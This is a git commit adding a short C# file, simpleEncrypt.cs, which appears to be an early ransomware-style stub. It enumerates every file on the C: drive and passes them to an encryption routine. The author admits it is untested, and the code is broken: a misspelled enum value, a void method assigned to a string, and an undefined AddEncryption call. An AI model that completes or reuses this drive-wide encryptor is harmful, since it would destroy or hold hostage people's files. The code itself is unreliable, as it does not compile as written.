6e45844cb95d4a7bec8264f46965320e7d090fc4
Panic Switch (skid) <skid_2.0@protonmail.com>
2016-10-18 14:44:12 -0400

    Create simpleEncrypt.cs

---
+++ simpleEncrypt.cs
@@ -0,0 +1,28 @@
+//by the way I havent tested or debugged this or anything yet, so fi it doesn't work for you, don't be mad at me.
+
+using System;
+using System.Security.Cryptography;
+using System.IO;
+using System.Security.AccessControl;
+
+namespace fileSystem {
+	class crypto {
+		public static void fileEnum() {
+			string[] files = Directory.GetFiles(@"C:\\", "*.*", SearchOption.AllDirectorys);
+		}
+		
+		public static void Main() {
+			try {
+				string filename = fileEnum();
+				
+				AddEncryption(filename);
+			}
+			
+			catch (Exception e) {
+				Console.WriteLine(e);
+			}
+			
+			Console.ReadLine();
+		}
+	}
+}
